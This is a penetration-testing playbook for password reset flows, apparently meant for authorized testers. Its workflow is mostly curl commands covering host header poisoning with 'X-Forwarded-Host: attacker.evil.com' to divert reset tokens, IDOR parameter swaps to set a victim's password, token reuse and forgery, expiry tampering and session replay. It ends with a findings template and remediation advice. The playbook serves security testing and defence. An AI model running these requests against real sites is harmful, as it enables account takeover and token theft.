---
name: testing-password-reset-flaws
description: Identifying and exploiting weaknesses in password reset flows including weak reset tokens,
  host header poisoning, IDOR on the identification parameter, missing session invalidation, and account enumeration.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- password-reset
- host-header-injection
- account-takeover
- idor
- owasp
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Testing Password Reset Flaws

## When to Use

- During authorized penetration tests of any "forgot password" / account-recovery flow
- When the application emails a reset link or token and you need to verify it is unguessable, single-use, and bound to the right user
- For validating that the reset endpoint cannot be poisoned via Host/X-Forwarded-Host to redirect tokens to an attacker
- When testing the user-identification parameter for IDOR that lets you reset another account's password
- During bug bounty programs targeting account takeover and broken authentication (OWASP A07:2021)

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target application
- **Burp Suite Professional**: Proxy + Repeater + Intruder + Sequencer (token entropy)
- **Two test accounts**: attacker-controlled inbox(es) plus a victim account you own
- **A catch-all / Burp Collaborator domain**: to observe poisoned reset links landing on an attacker host
- **curl / httpie**: For manual header injection and token replay
- **Access to the reset emails**: to capture real tokens and link structure

## Critical: Checks Most Often Missed

Password reset is one of the most reliable account-takeover surfaces. For every
reset flow, work through this checklist:

- **Host header poisoning** (highest signal): send the reset request with a
  spoofed `Host:` or `X-Forwarded-Host: attacker.com` (also try
  `X-Forwarded-Server`, `X-Host`, dangling `Host: target.com:@attacker.com`,
  absolute request line). If the emailed link points to `attacker.com/reset?token=...`,
  the victim's token is exfiltrated when they click — zero-interaction takeover.
- **IDOR on the identification parameter**: the reset confirm step often carries
  `user`, `email`, `user_id`, or `account` alongside the token. Swap it to the
  victim while keeping your own valid token to set the victim's password.
- **Token not invalidated after use / no expiry**: reuse a token after a
  successful reset, or use it long after issuance. Reusable or eternal tokens
  defeat single-use semantics.
- **Weak token entropy / sequential tokens**: request many resets rapidly and
  compare tokens. Incrementing counters, timestamps, or short tokens are
  predictable — generate the victim's token offline.
- **No session/token invalidation after reset**: old sessions of the victim stay
  valid after their password changes, and other outstanding reset tokens still work.
- **Reset link over HTTP**: the link uses `http://`, leaking the token over
  cleartext and via referrers.
- **Date/time params used to revalidate expired links**: links containing
  `expires=`/`ts=`/`timestamp=` that the server trusts — tamper the value to
  resurrect an expired token.
- **Account enumeration via reset responses**: different message, status code,
  or response time for existing vs. non-existing accounts reveals valid users.
- **Token leakage**: token in the URL is exposed via `Referer` to third-party
  assets loaded on the reset page, and in browser history / server logs.

## Workflow

### Step 1: Map the Reset Flow and Capture a Real Token

Walk the full flow and record every parameter and the email link structure.

```bash
# 1) Request a reset for an account you control; capture the request
curl -s -i -X POST "https://target.example.com/api/password/forgot" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@yourinbox.com"}'

# 2) Read the email you receive and note the link shape, e.g.:
#    https://target.example.com/reset?token=8f2a9c...&user=1337
#    (record token length/charset and any user/email/expires params)

# 3) Capture the confirm/submit request that actually sets the new password
curl -s -i -X POST "https://target.example.com/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"token":"8f2a9c...","user":1337,"password":"NewPassw0rd!"}'
```

### Step 2: Host Header / X-Forwarded-Host Poisoning

Force the emailed link to point at an attacker-controlled host.

```bash
# Variant A: override the Host header outright
curl -s -i -X POST "https://target.example.com/api/password/forgot" \
  -H "Host: attacker.evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@corp.com"}'

# Variant B: X-Forwarded-Host (and siblings) behind a proxy
curl -s -i -X POST "https://target.example.com/api/password/forgot" \
  -H "Host: target.example.com" \
  -H "X-Forwarded-Host: attacker.evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@corp.com"}'

# Other headers/tricks to try one at a time:
#   X-Forwarded-Server: attacker.evil.com
#   X-Host: attacker.evil.com
#   X-Forwarded-Host: attacker.evil.com, target.example.com
#   Host: target.example.com:@attacker.evil.com
#   Host: target.example.com\n\rHost: attacker.evil.com   (CRLF dual host)

# RESULT: inspect the victim's email (or your Collaborator/catch-all). If the
# reset link reads https://attacker.evil.com/reset?token=...  the token is
# delivered to you when the victim clicks => account takeover.
```

### Step 3: Token Entropy and Sequential-Token Harvesting

Determine whether tokens are predictable or guessable.

```bash
# Rapidly request many resets and diff the tokens
for i in $(seq 1 20); do
  curl -s -X POST "https://target.example.com/api/password/forgot" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker+'"$i"'@yourinbox.com"}' >/dev/null
  # then read each email and append the token to tokens.txt
done

# Look for structure:
#   - incrementing integers / counters
#   - unix timestamps or millisecond clocks (predict from request time)
#   - short hex/base36 (brute forceable)
#   - md5(email) or md5(userid) style (forgeable offline)

# Statistical entropy on captured tokens with Burp Sequencer:
#   Burp > send a forgot-password response containing the token to Sequencer
#   > Live capture thousands > Analyze for low effective bits / patterns.

# If md5/sha of a known value is suspected, confirm:
echo -n "victim@corp.com" | md5sum
# compare to the victim's observed/derived token
```

### Step 4: IDOR on the User-Identification Parameter

Reset another user's password using your own valid token.

```bash
# Use a VALID token issued to YOUR account, but change the user/email param
# on the confirm step to the victim. If the server keys off the param instead
# of binding the token to the account, the victim's password is set.

curl -s -i -X POST "https://target.example.com/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"token":"<YOUR_VALID_TOKEN>","user":4242,"password":"Pwned123!"}'

# Variations to test:
#   {"token":"<YOURS>","email":"victim@corp.com","password":"Pwned123!"}
#   /api/password/reset?token=<YOURS>&user_id=4242   (param in query)
#   parameter pollution: user=<you>&user=<victim>
#   add the victim id in a header the backend trusts (X-User-Id: 4242)

# Confirm by logging in as the victim with the new password.
```

### Step 5: Token Reuse, Expiry, and Date-Param Tampering

Test single-use semantics and link-expiry trust.

```bash
# --- Reuse after a successful reset ---
# Complete a reset with a token, then submit the SAME token again:
curl -s -i -X POST "https://target.example.com/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"token":"8f2a9c...","password":"Again123!"}'
# 200 = token not invalidated after use (reusable).

# --- Expiry bypass via date/time parameter ---
# If the link is .../reset?token=...&expires=1716000000 and the server trusts
# the param, push it into the future to revive an expired token:
curl -s -i "https://target.example.com/reset?token=OLD_EXPIRED&expires=9999999999"
# Also try removing the expires/ts param, or setting it to a far-future epoch.

# --- No session invalidation after reset ---
# Capture a victim session cookie BEFORE reset, perform the reset, then replay:
curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Cookie: SESSIONID=victim-old..." \
  "https://target.example.com/account"   # 200 = old session survives reset
```

### Step 6: Enumeration, HTTP Transport, and Token Leakage

Check disclosure side-channels and transport security.

```bash
# --- Account enumeration via differing responses ---
# Existing vs non-existing account: compare body, status, and timing.
curl -s -o /dev/null -w "exists:   %{http_code} %{time_total}\n" \
  -X POST "https://target.example.com/api/password/forgot" \
  -H "Content-Type: application/json" -d '{"email":"real@corp.com"}'
curl -s -o /dev/null -w "missing:  %{http_code} %{time_total}\n" \
  -X POST "https://target.example.com/api/password/forgot" \
  -H "Content-Type: application/json" -d '{"email":"nobody-xyz@corp.com"}'
# Different message ("email sent" vs "no account"), code, or a consistent
# timing gap => username enumeration.

# --- Reset link over HTTP ---
# Inspect the emailed link scheme; http:// leaks the token over cleartext.

# --- Token leakage via Referer to third parties ---
# Load the reset page through Burp and check outbound requests: if the page
# embeds external analytics/fonts/images, the Referer header carries
# ...?token=... to those third-party domains, leaking the token.
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Host Header Poisoning** | Server builds the reset link from a client-controlled Host/X-Forwarded-Host, sending the token to an attacker domain |
| **Token Entropy** | Unpredictability of the reset token; low entropy or structure enables guessing/forgery |
| **Sequential Tokens** | Tokens derived from counters/timestamps that can be predicted from a known value |
| **Single-Use Semantics** | A reset token must be invalidated immediately after one successful use |
| **Identification-Parameter IDOR** | Token not bound to the account; swapping user/email resets another user |
| **Session Invalidation** | All sessions and other outstanding tokens must be revoked when a password changes |
| **Expiry Trust** | Server trusting a client-supplied `expires`/`ts` param instead of server-side state |
| **Account Enumeration** | Differing reset responses/timing reveal which emails are registered |
| **Token Leakage** | Reset token exposed via HTTP transport, Referer to third parties, logs, or history |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Intercept/modify reset requests, inject Host headers, replay tokens |
| **Burp Sequencer** | Measure reset-token entropy across many captured samples |
| **Burp Collaborator / catch-all domain** | Observe poisoned reset links landing on an attacker host |
| **Burp Intruder / ffuf** | Brute force short/sequential tokens and enumerate accounts |
| **curl / httpie** | Manual Host-header injection, IDOR parameter swaps, token replay |
| **OWASP ZAP** | Free proxy alternative for header tampering and fuzzing |

## Common Scenarios

### Scenario 1: X-Forwarded-Host Token Theft
The application generates the reset link using the incoming `X-Forwarded-Host` header. An attacker submits a reset for the victim with `X-Forwarded-Host: attacker.com`; the victim receives an email whose link points to `attacker.com/reset?token=...`. Clicking it leaks the token, enabling takeover.

### Scenario 2: Identification IDOR
The reset confirm endpoint accepts `{"token":..., "email":...}` but only validates that the token is non-expired, not that it belongs to that email. An attacker uses their own valid token with the victim's email to set the victim's password.

### Scenario 3: Predictable Token
Reset tokens are `md5(email + small_counter)`. After observing the structure from their own resets, the attacker computes the victim's token offline and resets without any email access.

### Scenario 4: Token Reuse and No Session Kill
After a reset, the old token still works and the victim's pre-reset sessions remain valid, so a previously stolen session or a re-sent token retains access.

## Output Format

```
## Password Reset Finding

**Vulnerability**: Account Takeover via Host Header Poisoning
**Severity**: Critical (CVSS 9.1)
**Location**: POST /api/password/forgot (reset link generation)
**OWASP Category**: A07:2021 - Identification and Authentication Failures

### Reproduction Steps
1. Send POST /api/password/forgot for victim@corp.com with header X-Forwarded-Host: attacker.evil.com
2. Observe (via catch-all/Collaborator) the victim's reset email links to https://attacker.evil.com/reset?token=...
3. When the victim opens the link, the token is delivered to the attacker host
4. Replay the token against POST /api/password/reset to set a new password and log in as the victim

### Tested Weaknesses
| Test | Result |
|------|--------|
| Host / X-Forwarded-Host poisoning | Link host attacker-controlled |
| Identification-param IDOR | email param swappable |
| Token reuse after success | Reusable |
| Session invalidation after reset | Old sessions survive |
| Account enumeration | Distinct message for unknown email |
| Reset link transport | http:// (token in cleartext) |

### Impact
- Zero-to-one-click account takeover of any user by email address
- Reusable tokens and surviving sessions defeat remediation
- Enumeration enables targeted attacks at scale

### Recommendation
1. Build reset links from a server-side allowlisted canonical host; ignore Host/X-Forwarded-Host
2. Bind the token to the account server-side; never trust client user/email/expires params
3. Generate 128-bit CSPRNG tokens, single-use, short-lived, delivered only over HTTPS
4. Invalidate all sessions and outstanding tokens on successful reset
5. Return an identical, generic response for existing and non-existing accounts
```
